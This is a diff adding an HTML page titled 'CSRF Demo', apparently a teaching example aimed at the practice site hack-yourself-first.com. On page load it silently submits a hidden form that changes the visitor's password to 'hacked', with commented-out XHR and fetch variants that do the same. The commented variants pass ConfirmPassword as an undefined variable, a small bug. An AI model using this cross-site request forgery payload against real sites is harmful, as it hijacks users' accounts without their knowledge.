@@ -1,0 +1,59 @@
+<html>
+  <head>
+    <title>CSRF Demo</title>
+  </head>
+
+  <body>
+    <h1>Attacker Website</h1>
+    <form
+      id="malicious-form"
+      action="https://hack-yourself-first.com/Account/ChangePassword"
+      method="post"
+      style="display: none"
+    >
+      <input
+        id="NewPassword"
+        name="NewPassword"
+        type="password"
+        value="hacked"
+        aria-invalid="false"
+        class="valid"
+      />
+      <input
+        id="ConfirmPassword"
+        name="ConfirmPassword"
+        type="password"
+        value="hacked"
+      />
+    </form>
+
+    <script>
+      document.getElementById("malicious-form").submit();
+
+      /* AJAX Request
+
+          var formData = new FormData();
+          formData.append("NewPassword", "hacked");
+          formData.append("ConfirmPassword", hacked);
+          var request = new XMLHttpRequest();
+          request.open("POST", "https://hack-yourself-first.com/Account/ChangePassword");
+          request.send(formData);
+
+        */
+
+      /* Fetch Api
+
+          var formData = new FormData();
+          formData.append("NewPassword", "hacked");
+          formData.append("ConfirmPassword", hacked);
+          fetch('https://hack-yourself-first.com/Account/ChangePassword', {
+            method: 'POST',
+            credentials: "include",
+            body: formData
+          })
+          .then(response => response.json())
+
+        */
+    </script>
+  </body>
+</html>
